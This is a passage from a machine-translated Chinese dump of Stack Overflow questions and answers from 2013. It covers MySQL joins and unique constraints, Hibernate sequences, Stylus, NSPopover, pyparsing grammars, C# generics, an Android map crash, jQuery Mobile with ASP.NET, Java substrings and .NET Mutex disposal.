如果我有 2 个学术课程硕士和本科，结果我得到所有 ste 学生，但作为学术课程名称列，只有前 2 个学生有 de 学术课程的名称，其余学生有 null

```
Vasile  Magdalena-Maria Licenta
Ciotmonda   Oana-Maria  Master
Rus Diana   NULL
Turcu   Gabriel NULL 
```

我找不到我做错了什么

谢谢 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:29:35.807

我相信你需要加入

```
Students.AcademicProgram=AcademicProgrammes.Id 
```

代替

```
Students.SerialNumber=AcademicProgrammes.Id 
```

因此，您只能获得序列号为 1 和 2 的学生的学术课程名称（因为您只有两个课程）。

因此尝试以下

```
SELECT s.SerialNumber,
       s.Name, 
       s.Surname, 
       a.Name AS Program
  FROM Students s LEFT JOIN
       AcademicProgrammes a ON s.AcademicProgram=a.Id 
```

# mysql - MySQL INSERT时检查表中没有重复的两个字段

> ID：15154363
> 
> 赞同：0
> 
> 时间：2013-03-01T09:24:43.317
> 
> 标签：mysql

我有下表：

```
 table (id,
            longitude,
            latitude,
            longlat,
            address,
            description,
            kind,
            synonym,
            primary key(id)
      ); 
```

我需要检查字段`longlat`和`description`插入行是唯一的，并且没有具有**相同组合**的行`longlat`，`description`它是在它之前插入的表。

我应该如何修改我的查询？

```
 "INSERT INTO yandex_social_objects (longitude,latitude,longlat,address,description,kind,synonym) VALUES (val_1),(val_2),(val_3)...(val_n)" 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:30:27.263

在组合上添加一个`UNIQUE`约束，这样就不会发生这种情况：

```
ALTER TABLE yandex_social_objects
  ADD CONSTRAINT longlat_description_UQ
    UNIQUE (longlat, description) ; 
```

之后，您在表中的所有插入都将检查此组合的唯一性，并且成功或失败。

您可以使用`INSERT IGNORE`or`INSERT ... ON DUPLICATE KEY UPDATE ...`来处理唯一键冲突的不同行为。检查这个答案的差异：[`INSERT IGNORE`vs`INSERT … ON DUPLICATE KEY UPDATE`](https://stackoverflow.com/questions/548541/insert-ignore-vs-insert-on-duplicate-key-update)

# java - 使用休眠工具自动创建序列

> ID：15154366
> 
> 赞同：10
> 
> 时间：2013-03-01T09:25:15.183
> 
> 标签：java, hibernate, sequence

我想使用休眠工具（pojo to sql）生成序列。绝对可以正常工作。

```
@GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "seqid-gen")
@SequenceGenerator(name = "seqid-gen", sequenceName = "RTDS_ADSINPUT_SEQ" )
@Column(name="id")
public Long getId() {
    return id;
} 
```

这段代码在sql下面生成

```
create sequence RTDS_ADSINPUT_SEQ; 
```

问题是我想指定类似的属性

```
INCREMENT BY,NOCACHE CYCLE 
```

最终的 ddl 脚本应该如下所示

```
CREATE SEQUENCE  RTDS_ADSINPUT_SEQ  MINVALUE 1 MAXVALUE
999999999999999999 INCREMENT BY 1 START WITH 1 NOCACHE  ORDER  CYCLE ; 
```

但据我所知，hibernate 只支持`name, sequncename,allocation,initialvalue`

如果我可以将这些属性作为注释包含在 pojo 中，请告诉我。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-01-31T09:39:43.550

我在 Hibernate 源代码 (4.2.7) 中查找了它。无法使用注释（无论是 JPA 还是 Hibernate）来指定它。

但是，您可以提供自己的方言来实现此目的。

```
public class MyOwnOracleDialect extends Oracle10gDialect {

    @Override
    protected String getCreateSequenceString(final String sequenceName, final int initialValue, final int incrementSize)
        throws MappingException {
        String createSequenceString = super.getCreateSequenceString(sequenceName, initialValue, incrementSize);
        return createSequenceString + " NOCACHE ORDER CYCLE"; // modify this string as you like
    }
} 
```

有这样的实体

```
@Entity
public class MyEntity {

    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "seqid-gen")
    @SequenceGenerator(name = "seqid-gen", sequenceName = "RTDS_ADSINPUT_SEQ", allocationSize = 1, initialValue = 0)
    @Column(name="id")
    private Long id;

    // ...

} 
```

您可以按照 Hibernate 文档 ( [http://docs.jboss.org/hibernate/orm/4.2/manual/en-US/html/ch03.html#configuration-optional-dialects](http://docs.jboss.org/hibernate/orm/4.2/manual/en-US/html/ch03.html#configuration-optional-dialects) )中的说明设置新的方言

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-06T10:25:25.483

我想你正在寻找这样的东西

```
 <id name="pk_field" column="column_name">
        <generator class="sequence">
            <param name="sequence">sequence_name</param>
            <param name="parameters">START WITH 5 INCREMENT BY 10</param>
        </generator>
    </id> 
```

# html - 使用 Stylus 从现有值更改 CSS 属性

> ID：15154368
> 
> 赞同：2
> 
> 时间：2013-03-01T09:25:19.247
> 
> 标签：html, css, stylus

我有一组像这样的样式：

```
&.blue
  background #189cd8
  &:hover
    background lighten(#189cd8, 10%) 
```

我想知道是否可以不为悬停状态第二次设置该颜色，而是以某种方式从父级获取它，比如`background lighten(parent(background), 10%)`？我知道我可以使用变量，但在这里我只想参考父级的颜色，所以不想使用它们。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-24T00:16:04.083

您可以使用 Stylus 的属性查找功能：

```
&.blue
  background #189cd8
  &:hover
    background lighten(@background, 10%) 
```

从[http://learnboost.github.com/stylus/docs/variables.html](http://learnboost.github.com/stylus/docs/variables.html)：

> 属性查找将“冒泡”堆栈直到找到，如果无法解析属性，则返回 null。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:59:26.077

您是否尝试过使用背景：继承；

# objective-c - 显示 NSPopOver

> ID：15154372
> 
> 赞同：0
> 
> 时间：2013-03-01T09:25:33.227
> 
> 标签：objective-c, macos, cocoa, nspopover

我有一个类，它是从具有所有功能的 xib 的窗口控制器派生的。在这个 xib 中，我有一个显示大厅列表的表格视图。如果我双击一个大厅名称，我会得到一个弹出框，显示该大厅的特征。我有一个视图控制器类，我会在其中以编程方式创建弹出窗口，

```
NSPopover *popover;
NSViewController *popoverViewController;

-(void)displayPopover{
    popover = [[NSPopover alloc] init];
    [popover setBehavior: NSPopoverBehaviorApplicationDefined];
    [popover setDelegate: self];
    popoverViewController = [[CHBPopover alloc] initWithNibName: @"MYViewController" bundle: nil];
    [popover setContentViewController: popoverViewController];
    [popover setContentSize: popoverViewController.view.frame.size];

    [popover showRelativeToRect: NSMakeRect(700, 400, 5, 5) 
                         ofView: [[NSApp keyWindow] contentView]
                  preferredEdge: NSMaxXEdge];
} 
```

在我的窗口控制器类中，我有一个方法，例如，

```
-(IBAction)featuresDisplay:(id)sender{

    if([_hallNamesList selectedRow] == -1){
        [self setFeaturesList:nil];
    } 
    else {

       //[self.hallFeaturesPopOver showRelativeToRect:[_hallNamesList frameOfCellAtColumn:0 row:[_hallNamesList selectedRow]] ofView:_hallNamesList preferredEdge:NSMaxXEdge];
       // [pop.displayPopover ];
       NSDictionary *hallFeaturesDictionary;
       hallFeaturesDictionary = [_hallNames objectAtIndex:[_hallNamesList selectedRow]];
       _hallId=[hallFeaturesDictionary valueForKey:@"hallId"];
       [officeDetails setHallName:[hallFeaturesDictionary valueForKey:@"hallName"]];

       _featuresList=[conferenceHall getConferenceHallFeaturesWithDetails:officeDetails];
       NSLog(@"features list=%@",_featuresList);
      [self setFeaturesList:[conferenceHall getConferenceHallFeaturesWithDetails:officeDetails]];
    }
} 
```

我将如何在此 IBAction 中调用该弹出框方法？我需要双击一行并显示弹出窗口。我该怎么做？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T14:43:24.817

显示坐标似乎很偏离。弹出框的矩形是相对于 ofView 参数的。这里从 (0, 0) 开始，它应该在 keywindow.contentView 的左上角显示弹出框。然后微调位置。您可能必须从 IBAction 传入实际的矩形（可能是表格单元格边界）。弹出框的视图矩形中的大小部分很重要，因为弹出框相对于它移动。我还会传入视图以将弹出框附加到，因为有时单击视图时视图不会成为关键。

请注意，仅当您计划将其分离到浮动窗口中时，才需要弹出窗口的委托。也试验一下这种行为。从 NSPopoverBehaviorTransient 开始。我不确定您实际上与应用程序定义的行为有什么关系，但至少对于瞬态行为它对我来说很好。

最后，您不需要在每次显示弹出框时都重新创建它。只需在 awakeFromNib 中设置它，然后在`showRelativeToRect...`每次需要时调用它。随着瞬态行为，它会自动消失。

# python - pyparsing中如何解析节点和节点关系？

> ID：15154375
> 
> 赞同：3
> 
> 时间：2013-03-01T09:25:38.267
> 
> 标签：python, parsing, nodes, pyparsing

我已经构建了一个原始解析器，但我真的很想让它在 pyparsing 中工作。

我想解析两种类型的字符串。仅解析节点和第二个节点关系的一种

```
verb node1, node2, ... 
```

和

```
verb node1->node2->node3 
```

您可以指定一个或多个节点，可以另外引用您可以通过添加一个来指示一个节点在另一个节点内`^`

```
verb node1, node2 ^ node3, node4 
```

您可能还想使用`->`、`<-`或`<->`指示符来指示节点关系。

```
verb node1->node2<->node3 
```

同样，您可以通过使用`^`

```
verb node1->node2^node4<->node3 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T12:40:59.213

这种格式的概念 BNF 如下所示：

```
node :: word composed of alphas, digits, '_'
verb :: one of several defined keywords
binop :: '->' | '<-' | '<->'
nodeFactor :: node '^' node | node
nodeExpr :: nodeFactor op nodeFactor
nodeCommand :: verb nodeExpr [',' nodeExpr]... 
```

这映射到 pyparsing 几乎一步一步：

```
from pyparsing import (Word,alphas,alphanums,Keyword,
    infixNotation,opAssoc,oneOf,delimitedList)

nodeRef = Word(alphas,alphanums+'_')
GO, TURN, FOLLOW = map(Keyword, "GO TURN FOLLOW".split())
verb = GO | TURN | FOLLOW
binop = oneOf('-> <- <->') 
```

`infixNotation`下一部分使用 pyparsing 的方法（以前称为）最容易实现`operatorPrecedence`。`infixNotation`允许我们定义操作的层次结构，并将根据层次结构定义的优先级对解析的输出进行分组。我假设您的`'^'`“在内部”运算符应该在 binary`'->'`等运算符之前进行评估。`infixNotation`还允许在括号内嵌套，但是您的示例都没有表明这是绝对需要的。您可以通过指定基本操作数类型，`infixNotation`后跟 3 元组列表来定义操作员：`opAssoc.LEFT``RIGHT`

```
nodeExpr = infixNotation(nodeRef,
    [
    ('^', 2, opAssoc.LEFT),
    (binop, 2, opAssoc.LEFT),
    ]) 
```

最后，我们定义了整体表达式，我将其解释为某种命令。逗号分隔的节点表达式列表可以直接实现为`nodeExpr + ZeroOrMore(Suppress(',') + nodeExpr)`（我们从解析的输出中抑制逗号 - 它们在解析时很有用，但之后我们只需要跳过它们）。但这经常出现， *pyparsing*提供了方法`delimitedList`：

```
nodeCommand = verb('verb') + delimitedList(nodeExpr)('nodes') 
```

名称“verb”和“nodes”导致在各自表达式中解析的结果与这些名称相关联，这将使解析完成后更容易处理解析的数据。

现在测试解析器：

```
tests = """\
    GO node1,node2
    TURN node1->node2->node3
    GO node1,node2^node3,node4
    FOLLOW node1->node2<->node3
    GO node5,node1->node2^node4<->node3,node6
    """.splitlines()
for test in tests:
    test = test.strip()
    if not test:
        continue
    print (test)
    try:
        result = nodeCommand.parseString(test, parseAll=True)
        print (result.dump())
    except ParseException as pe:
        print ("Failed:", test)
        print (pe) 
```

该`dump()`方法将解析的标记打印为嵌套列表，然后列出每个结果名称及其附加值：

```
GO node1,node2
['GO', 'node1', 'node2']
- nodes: ['node1', 'node2']
- verb: GO
TURN node1->node2->node3
['TURN', ['node1', '->', 'node2', '->', 'node3']]
- nodes: [['node1', '->', 'node2', '->', 'node3']]
- verb: TURN
GO node1,node2^node3,node4
['GO', 'node1', ['node2', '^', 'node3'], 'node4']
- nodes: ['node1', ['node2', '^', 'node3'], 'node4']
- verb: GO
FOLLOW node1->node2<->node3
['FOLLOW', ['node1', '->', 'node2', '<->', 'node3']]
- nodes: [['node1', '->', 'node2', '<->', 'node3']]
- verb: FOLLOW
GO node5,node1->node2^node4<->node3,node6
['GO', 'node5', ['node1', '->', ['node2', '^', 'node4'], '<->', 'node3'], 'node6']
- nodes: ['node5', ['node1', '->', ['node2', '^', 'node4'], '<->', 'node3'], 'node6']
- verb: GO 
```

此时，您可以只解析您的命令，然后根据`verb`, 分派到执行该动词的任何适当方法。

但是让我提出一个我发现有助于使用 Python 对象捕获此逻辑的结构。定义一个简单的命令类层次结构，以抽象方法实现各种动词功能`doCommand`：

```
# base class
class Command(object):
    def __init__(self, tokens):
        self.cmd = tokens.verb
        self.nodeExprs = tokens.nodes

    def doCommand(self):
        """
        Execute command logic, using self.cmd and self.nodeExprs.
        To be overridden in sub classes.
        """
        print (self.cmd, '::', self.nodeExprs.asList())

# these should implement doCommand, but not needed for this example
class GoCommand(Command): pass
class TurnCommand(Command): pass
class FollowCommand(Command): pass 
```

此方法会将您的解析结果转换为相应命令类的实例：

```
verbClassMap = {
    'GO' : GoCommand,
    'TURN' : TurnCommand,
    'FOLLOW' : FollowCommand,
    }
def tokensToCommand(tokens):
    cls = verbClassMap[tokens.verb]
    return cls(tokens) 
```

但是您也可以将它作为解析时回调构建到您的解析器中，这样一旦解析完成，您不仅会获得字符串和子列表的列表，而且还可以通过调用其`doCommand`方法来准备“执行”的对象。为此，只需`tokensToCommand`在整个`nodeCommand`表达式上附加一个解析操作：

```
nodeCommand.setParseAction(tokensToCommand) 
```

现在我们稍微修改一下我们的测试代码：

```
for test in tests:
    test = test.strip()
    if not test:
        continue
    try:
        result = nodeCommand.parseString(test, parseAll=True)
        result[0].doCommand()
    except ParseException as pe:
        print ("Failed:", test)
        print (pe) 
```

由于我们实际上并没有`doCommand`在子类上实现，我们得到的只是默认的基类行为，它只是回显解析的动词和节点列表：

```
GO :: ['node1', 'node2']
TURN :: [['node1', '->', 'node2', '->', 'node3']]
GO :: ['node1', ['node2', '^', 'node3'], 'node4']
FOLLOW :: [['node1', '->', 'node2', '<->', 'node3']]
GO :: ['node5', ['node1', '->', ['node2', '^', 'node4'], '<->', 'node3'], 'node6'] 
```

（此代码使用 Python 3，pyparsing 2.0.0 运行。它也将使用 Python 2，pyparsing 1.5.7 运行。）

**编辑**

要将链式表达式`a op b op c`转换为`[a,op,b], [b, op, c]`，请使用解析操作将 [a,op,b,op,c] 结果重构为成对表达式。该`infixNotation`方法允许您定义解析操作以附加到运算符层次结构中的级别。

重构链式表达式结果的方法如下所示：

```
def expandChainedExpr(tokens):
    ret = ParseResults([])
    tokeniter = iter(tokens[0])
    lastexpr = next(tokeniter)
    for op,nextexpr in zip(tokeniter,tokeniter):
        ret += ParseResults([[lastexpr, op, nextexpr]])
        lastexpr = nextexpr
    return ret 
```

这将构建一个全新的 ParseResults 来替换原始的链接结果。注意每个如何`lastexpr op nextexpr`保存为自己的子组，然后`nextexpr`被复制到`lastexpr`，然后循环以获取下一个 op-nextexpr 对。

要将此重新格式化程序附加到解析器中，请将其添加为该层次结构级别的第四个元素`infixNotation`：

```
nodeExpr = infixNotation(nodeRef,
    [
    ('^', 2, opAssoc.LEFT),
    (binop, 2, opAssoc.LEFT, expandChainedExpr),
    ]) 
```

现在的输出：

```
FOLLOW node1->node2<->node3 
```

扩展为：

```
('FOLLOW', '::', [['node1', '->', 'node2'], ['node2', '<->', 'node3']]) 
```

# c#-4.0 - 继承通用不变性 C#4

> ID：15154376
> 
> 赞同：1
> 
> 时间：2013-03-01T09:25:46.047
> 
> 标签：c#-4.0, generics, inheritance, instance, variance

我一直在寻找为什么这个通用构造不能编译

我得到：
无法将类型“WpfApplication1.CowDao”隐式转换为“WpfApplication1.Dao”

```
public abstract class Animal { }

public class Dog : Animal { }

public class Cow : Animal { }

public abstract class Dao<T> where T : Animal 
{
    public void Insert(T t);
}

public class DogDao : Dao<Dog> { }

public class CowDao : Dao<Cow> { }

public class Main
{
    public Main()
    { 
        Dao<Animal> dao = null;

        if (true) dao = new DogDao();
        else dao = new CowDao();
    }
} 
```

我只是想达到我的目标->制作一个“中立”实例
我认为我的结构必须改变，但我不知道如何

我正在使用 .NET Framework 4

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:29:34.883

将 Dao 层的继承更改为

```
public class DogDao : Dao<Animal> { }

public class CowDao : Dao<Animal> { } 
```

编辑：

```
 public abstract class Dao<T> where T : Animal
    {
        public virtual void Insert(T t)
        {

        }

        protected void ExecuteQuery(string quer)
        {

        }
    }

    public class DogDao : Dao<Dog>
    {
        public override void Insert(Dog t)
        {
            string insert = "INSERT INTO DOG ...";

            base.ExecuteQuery(insert);
        }
    }

    public class CowDao : Dao<Cow>
    {
        public override void Insert(Cow t)
        {
            string insert = "INSERT INTO COW ...";

            base.ExecuteQuery(insert);
        }

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:41:57.087

派生的泛型不会从基类的泛型继承，因此您不能将一个转换为另一个。相反，编写一个扩展方法 ToGenericParent 像这样转换：

```
public static Generic<Parent> ToGenericParent(this Generic<Derived> derived)
        {
            return new Generic<Parent>() { Value = derived.Value };
        } 
```

# android - IndexOutofBoundException 在我的地图类运行时显示

> ID：15154380
> 
> 赞同：0
> 
> 时间：2013-03-01T09:25:59.490
> 
> 标签：android, android-mapview, indexoutofboundsexception, runtimeexception

现在我正在使用一个地图类来显示地图中两个地方之间的方向。但是当我运行这个活动时，它会在 logcat 中显示一个运行时异常。它指定了索引越界异常，有人请帮我解决这个问题。 **我的活动课**

```
public class CompassActivity extends MapActivity {
        MapView mv;

        MapController mc;

        Button Save, Cancel;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.car_finder_maplayout);
                MapView mv = (MapView)findViewById(R.id.carfinder_mapview);
                mv.setBuiltInZoomControls(true);
                MapController mc = mv.getController();
                ArrayList<GeoPoint> all_geo_points = getDirections(10.154929, 76.390316, 10.015861, 76.341867);
                GeoPoint moveTo = all_geo_points.get(0);
                mc.animateTo(moveTo);
                mc.setZoom(12);
                mv.getOverlays().add(new MyOverlay(all_geo_points));
        }

        public class MyOverlay extends Overlay {
                private ArrayList<GeoPoint> all_geo_points;

                public MyOverlay(ArrayList<GeoPoint> allGeoPoints) {
                        super();
                        this.all_geo_points = allGeoPoints;
                }

                @Override
                public boolean draw(Canvas canvas, MapView mv, boolean shadow, long when) {
                        super.draw(canvas, mv, shadow);
                        drawPath(mv, canvas);
                        return true;
                }

                public void drawPath(MapView mv, Canvas canvas) {
                        int xPrev = -1, yPrev = -1, xNow = -1, yNow = -1;
                        Paint paint = new Paint();
                        paint.setColor(Color.BLUE);
                        paint.setStyle(Paint.Style.FILL_AND_STROKE);
                        paint.setStrokeWidth(4);
                        paint.setAlpha(100);
                        if (all_geo_points != null) for (int i = 0; i < all_geo_points.size() - 4; i++) {
                                GeoPoint gp = all_geo_points.get(i);
                                Point point = new Point();
                                mv.getProjection().toPixels(gp, point);
                                xNow = point.x;
                                yNow = point.y;
                                if (xPrev != -1) {
                                        canvas.drawLine(xPrev, yPrev, xNow, yNow, paint);
                                }
                                xPrev = xNow;
                                yPrev = yNow;
                        }
                }
        }

        public static ArrayList<GeoPoint> getDirections(double lat1, double lon1, double lat2, double lon2) {
                String url = "http://maps.googleapis.com/maps/api/directions/xml?origin=" + lat1 + "," + lon1 + "&destination=" + lat2 + "," + lon2
                                + "&sensor=false&units=metric";
                String tag[] = {"lat", "lng"};
                ArrayList<GeoPoint> list_of_geopoints = new ArrayList<GeoPoint>();
                HttpResponse response = null;
                try {
                        HttpClient httpClient = new DefaultHttpClient();
                        HttpContext localContext = new BasicHttpContext();
                        HttpPost httpPost = new HttpPost(url);
                        response = httpClient.execute(httpPost, localContext);
                        InputStream in = response.getEntity().getContent();
                        DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
                        Document doc = builder.parse(in);
                        if (doc != null) {
                                NodeList nl1, nl2;
                                nl1 = doc.getElementsByTagName(tag[0]);
                                nl2 = doc.getElementsByTagName(tag[1]);
                                if (nl1.getLength() > 0) {
                                        list_of_geopoints = new ArrayList<GeoPoint>();
                                        for (int i = 0; i < nl1.getLength(); i++) {
                                                Node node1 = nl1.item(i);
                                                Node node2 = nl2.item(i);
                                                double lat = Double.parseDouble(node1.getTextContent());
                                                double lng = Double.parseDouble(node2.getTextContent());
                                                list_of_geopoints.add(new GeoPoint((int) (lat * 1E6), (int) (lng * 1E6)));
                                        }
                                } else {
                                        // No points found
                                }
                        }
                } catch (Exception e) {
                        e.printStackTrace();
                }
                return list_of_geopoints;
        }

        @Override
        protected boolean isRouteDisplayed() {
                // TODO Auto-generated method stub
                return true;
        }
} 
```

**日志猫**

```
03-01 14:40:08.758: E/AndroidRuntime(1890): FATAL EXCEPTION: main
03-01 14:40:08.758: E/AndroidRuntime(1890): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.kodspider.parkon/com.kodspider.parkon.CompassActivity}: java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2059)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.ActivityThread.startActivityNow(ActivityThread.java:1900)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.LocalActivityManager.moveToState(LocalActivityManager.java:135)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.LocalActivityManager.startActivity(LocalActivityManager.java:347)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.widget.TabHost$IntentContentStrategy.getContentView(TabHost.java:694)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.widget.TabHost.setCurrentTab(TabHost.java:358)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.widget.TabHost$2.onTabSelectionChanged(TabHost.java:150)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.widget.TabWidget$TabClickListener.onClick(TabWidget.java:546)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.view.View.performClick(View.java:4084)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.view.View$PerformClick.run(View.java:16966)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.os.Handler.handleCallback(Handler.java:615)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.os.Handler.dispatchMessage(Handler.java:92)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.os.Looper.loop(Looper.java:137)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.ActivityThread.main(ActivityThread.java:4745)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at java.lang.reflect.Method.invokeNative(Native Method)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at java.lang.reflect.Method.invoke(Method.java:511)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at dalvik.system.NativeStart.main(Native Method)
03-01 14:40:08.758: E/AndroidRuntime(1890): Caused by: java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0
03-01 14:40:08.758: E/AndroidRuntime(1890):     at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:251)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at java.util.ArrayList.get(ArrayList.java:304)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at com.kodspider.parkon.CompassActivity.onCreate(CompassActivity.java:43)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.Activity.performCreate(Activity.java:5008)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1079)
03-01 14:40:08.758: E/AndroidRuntime(1890):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2023)
03-01 14:40:08.758: E/AndroidRuntime(1890):     ... 18 more 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:31:48.940

您的错误是： java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0

崩溃发生在 getDirections 调用的调用者中。现在我发现有 1 个位置可能会出错：

```
GeoPoint moveTo = all_geo_points.get(0); 
```

`get(0)`如果里面没有的话会崩溃==>你的错误

`list_of_geopoints` 此外（次要）不需要第二次创建：

```
list_of_geopoints = new ArrayList<GeoPoint>(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:52:39.653

您的 getDirections(10.154929, 76.390316, 10.015861, 76.341867) 很可能不会返回任何积分。您得到一个空数组并尝试读取第一个元素。应该调试这个方法，看看为什么它没有得到任何结果。

为避免对不返回点的路线进行的任何调用崩溃，您应该这样做：

```
if (all_geo_points != null && all_geo_points.size() > 0) {
    GeoPoint moveTo = all_geo_points.get(0);
    mc.animateTo(moveTo);
    mc.setZoom(12);
    mv.getOverlays().add(new MyOverlay(all_geo_points));
} 
```

# asp.net - jquery Mobile aand Asp.net Button click 事件未触发并重定向到返回 url

> ID：15154382
> 
> 赞同：2
> 
> 时间：2013-03-01T09:26:01.680
> 
> 标签：asp.net, jquery-mobile

我有以下代码

```
 <div class="main" data-role="content">
        <div class="choice_list menuwrapper" >
            <ul data-role="listview" data-inset="true">
                <li><a href="CreateUser.aspx" data-transition="slidedown" >

                        Create User
                </a></li>
                <li><a href="WebForm1.aspx" data-transition="slidedown">

                        Manage User

                </a></li>
                <li><a href="Default.aspx" data-transition="slidedown">

                        Upload File
                </a></li>
            </ul>
        </div>
        <asp:ContentPlaceHolder ID="MainContent" runat="server" />
    </div>` 
```

但是当我尝试单击 createuser 或其他页面上的任何按钮时，button_click 事件未在 asp.net 中触发，并且页面重定向到 default.aspx，我在使用谷歌搜索时发现

```
 $(document).bind("mobileinit", function () {
        // jQuery Mobile's Ajax navigation does not work in all cases (e.g.,
        // when navigating from a mobile to a non-mobile page), especially when going back, hence disabling it.
        $.mobile.ajaxEnabled = false;
        $.mobile.ajaxLinksEnabled = false;

    }); 
```

它会解决，但在我的情况下没有运气，请有人帮助我。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-10T18:02:20.823

我在一个相当大的移动项目中遇到了类似的问题。在将 .NET 母版页与 jQuery Mobile 一起使用时，我们还遇到了其他错误。我们最终没有使用母版页，因为问题太多了。

尝试添加`data-ajax="false"`所有链接。这应该是您发布的代码正在执行的操作，但它可能无法正常工作，具体取决于您使用的 JQM 版本。

# java - 从字符串 Java 中提取文本

> ID：15154387
> 
> 赞同：3
> 
> 时间：2013-03-01T09:26:19.463
> 
> 标签：java

使用此字符串“ADACADABRA”。如何从java中的字符串“ADACADABRA”中提取“CADA”。

以及如何提取“/”和“？”之间的id 从下面的链接。

[http://www.youtube-nocookie.com/embed/zaaU9lJ34c5?rel=0](http://www.youtube-nocookie.com/embed/zaaU9lJ34c5?rel=0)

输出应该是：zaaU9lJ34c5

但应该使用“/”和“？” 进行中。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T09:55:06.280

```
and also how to extract the id between "/" and "?" from the link below.

http://www.youtube-nocookie.com/embed/zaaU9lJ34c5?rel=0

output should be: zaaU9lJ34c5 
```

应该 ：

```
String url = "http://www.youtube-nocookie.com/embed/zaaU9lJ34c5?rel=0";
String str = url.substring(url.lastIndexOf("/") + 1, url.indexOf("?")); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-01T09:28:02.803

```
 String s = "ADACADABRA";
  String s2 = s.substring(3,7); 
```

这里 3 指定开始索引，7 指定停止点。返回的字符串包含从开始索引到结束索引的所有字符，但不包括结束索引。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-01T09:30:49.113

我不完全确定你所说的提取是什么意思，所以我提供了从字符串中删除它的代码，我不确定这是否是你想要的。

```
public static void main (String args[]){
        String string = "ADACADABRA";
        string = string.replace("CADA", "");
        System.out.println(string);
    } 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-03-01T09:43:46.577

这是未经测试的，但这样的事情可能对 youtube 部分有所帮助：

```
 String youtubeUrl = "http://www.youtube-nocookie.com/embed/zaaU9lJ34c5?rel=0";

     String[] urlParts = youtubeUrl.split("/");

     String videoId = urlParts[urlParts.length - 1];

     videoId = videoId.substring(0, videoId.indexOf("?")); 
```

从字符串中提取 CADA 没有任何意义。您需要指定如何确定 CADA 是要提取的字符串。

例如，是因为它是中间 4 个字符吗？是因为你每边剥掉 3 个字符吗？您只是在寻找字符串“CADA”吗？它是字符串的第 3,7 个字符吗？它是字符串最后 7 个字符中的前 4 个吗？是因为它包含2个元音和2个辅音吗？我可以继续..

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-01T09:33:06.643

```
String regex = "CADA";
Pattern p = Pattern.compile(regex, Pattern.MULTILINE);

Matcher m = p.matcher(originalText);
while (m.find()) {
    String outputThis = m.group(1);
} 
```

使用这个工具[http://www.regexplanet.com/advanced/java/index.html](http://www.regexplanet.com/advanced/java/index.html)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-01T09:31:03.053

可能，您没有考虑到`java.lang.String`不变性这一事实。这就是为什么您需要将子字符串化的结果分配给新变量的原因。

# c# - .NET 互斥体是否使用非托管资源？

> ID：15154394
> 
> 赞同：-1
> 
> 时间：2013-03-01T09:26:29.660
> 
> 标签：c#, multithreading, synchronization, mutex, dispose

MSDN 文章[Mutex Class](http://msdn.microsoft.com/en-us/library/system.threading.mutex%28v=vs.100%29.aspx)告诉（在代码示例的注释中）：

> 与 Monitor 不同，Mutex 可以与 WaitHandle.WaitAll 和 WaitAny 一起使用，并且可以跨 AppDomain 边界传递

这是否意味着互斥锁使用非托管资源？
那么，为什么 MSDN 关于 Mutex 使用的代码示例不使用 Dispose()？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:30:12.313

